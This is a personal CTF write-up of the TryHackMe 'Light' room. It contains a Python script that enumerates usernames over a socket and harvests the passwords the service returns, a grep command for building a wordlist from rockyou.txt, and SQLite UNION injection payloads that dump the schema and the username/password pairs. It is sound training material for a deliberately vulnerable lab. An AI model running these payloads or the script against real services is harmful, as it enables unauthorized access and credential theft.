### Room: 
[Try LIGHT room on THM](https://tryhackme.com/room/lightroom)

### CTF intro: 
"I am working on a database application called Light! Would you like to try it out?
If so, the application is running on port 1337. You can connect to it using:

```bash
nc MACHINE_IP 1337
```

You can use the username smokey in order to get started."

### Notes
- With all this info I started as suggested, providing username you will get a password
- First idea actually was not SQL injection, but just a bruteforce, so I wrote a short python script to poke the service:

```python
import socket
import argparse
import time
import re

def brute_force(ip, port, userlist):
    try:
        with open(userlist, "r") as f:
            for user in f:
                user = user.strip()
                print(f"[*] Trying username: {user}")
                
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, port))
                    s.recv(1024)  # Wait for initial prompt (if needed)
                    time.sleep(0.5)  # if need
                    s.sendall(user.encode())  # Send username
                    
                    time.sleep(0.5)  # if need
                    response = s.recv(1024).decode()
                    
                    # Extract password using regex
                    match = re.search(r'Password:\s*(\S+)', response)
                    if match:
                        password = match.group(1)
                        print(f"[+] Found password for {user}: {password}")
                    
                    s.close()
                except Exception as e:
                    print(f"[-] Error: {e}")
    except FileNotFoundError:
        print("[!] Username file not found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force username enumeration over netcat-like service.")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port number")
    parser.add_argument("userlist", help="Path to the username list file")
    
    args = parser.parse_args()
    
    brute_force(args.ip, args.port, args.userlist)
```

- Preparing wordlist: I count that username must have 14 symbols so decide to create a new list (using rockyou.txt) since it is easy room so quick bash for that:

```bash
grep -o '\b\w\{14\}\b' rockyou.txt > 14_symbols_words.txt
```

- Starting bruteforce I realized since it is a database we could try SQLInjections meanwhile.
- After some time of trying different payloads I found that UNION could work in this case (pay attention to letter cases) and it is a sqlite kind of db:

```sql
' Union 1 '
' Union Select group_concat(sql) From sqlite_master '
' Union Select group_concat(username || '~' || password) From <here will be some table from previous query> '
```

- Actually that's it for this room, python script was kind waste of time from this room point of view but anyway I like to write scripts so no regret haha :D
